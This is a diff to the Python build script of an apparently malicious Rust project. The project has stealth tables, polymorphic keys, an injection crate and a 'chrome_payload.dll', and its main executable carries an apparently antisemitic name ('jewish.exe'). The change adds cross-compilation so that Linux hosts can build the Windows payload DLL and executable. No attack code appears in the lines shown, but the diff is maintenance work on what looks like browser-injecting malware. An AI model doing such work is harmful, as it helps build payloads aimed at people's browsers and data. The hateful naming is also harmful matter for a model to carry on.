@@ -34,9 +34,19 @@ ENCRYPTED_RS = os.path.join(PROJECT_ROOT, "src", "encrypted.rs")
 STEALTH_RS = os.path.join(PROJECT_ROOT, "src", "inject", "src", "stealth_tables.rs")
 POLYMORPHIC_RS = os.path.join(PROJECT_ROOT, "src", "polymorphic_keys.rs")
 POLYMORPHIC_INJECT_RS = os.path.join(PROJECT_ROOT, "src", "inject", "src", "polymorphic_keys.rs")
-TARGET_EXE = os.path.join(PROJECT_ROOT, "target", "release", "jewish.exe")
-TARGET_DLL = os.path.join(PROJECT_ROOT, "target", "release", "chrome_payload.dll")
 RELEASE_DIR = os.path.join(PROJECT_ROOT, "release")
+
+# On Linux, cross-compile for Windows; on Windows build natively
+import platform as _platform
+if _platform.system() == "Windows":
+    _CARGO_EXTRA = []
+    _TARGET_REL  = os.path.join(PROJECT_ROOT, "target", "release")
+else:
+    _CARGO_EXTRA = ["--target", "x86_64-pc-windows-gnu"]
+    _TARGET_REL  = os.path.join(PROJECT_ROOT, "target", "x86_64-pc-windows-gnu", "release")
+
+TARGET_EXE = os.path.join(_TARGET_REL, "jewish.exe")
+TARGET_DLL = os.path.join(_TARGET_REL, "chrome_payload.dll")
 
 
 # ===== UTILITY FUNCTIONS =====
@@ -150,7 +160,7 @@ def main():
 
     # Step 3: Build payload DLL (64-bit)
     print("\n===== 2/7 Building Payload DLLs =====")
-    if not run_command(["cargo", "build", "--release", "-p", "chrome-payload"], "Building chrome_payload.dll (64-bit)"):
+    if not run_command(["cargo", "build", "--release", "-p", "chrome-payload"] + _CARGO_EXTRA, "Building chrome_payload.dll (64-bit)"):
         print("[!] Payload build failed - aborting")
         sys.exit(1)
     if not os.path.exists(TARGET_DLL):
@@ -171,7 +181,7 @@ def main():
     env = {**os.environ, "JEWISH_DEBUG": debug_flag}
     try:
         process = subprocess.Popen(
-            ["cargo", "build", "--release", "-p", "jewish"],
+            ["cargo", "build", "--release", "-p", "jewish"] + _CARGO_EXTRA,
             cwd=PROJECT_ROOT, env=env,
             stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
         )
